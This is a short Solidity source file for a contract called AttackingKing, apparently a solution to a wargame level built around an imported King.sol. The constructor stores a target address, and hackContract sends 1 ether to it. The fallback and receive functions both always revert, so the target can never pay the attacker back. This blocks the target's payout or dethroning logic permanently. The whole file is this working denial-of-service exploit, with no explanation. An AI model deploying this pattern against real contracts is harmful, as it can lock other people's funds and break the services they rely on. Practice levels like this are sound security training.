// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        (bool success, ) = contractAddress.call{value: 1 ether}("");
        require(success, "REVERTED @ AttackingKing.hackContract");
    }

    fallback() external payable {
        revert("REVERTED @ AttackingKing.fallback");
    }

    receive() external payable {
        revert("REVERTED @ AttackingKing.receive");
    }

}
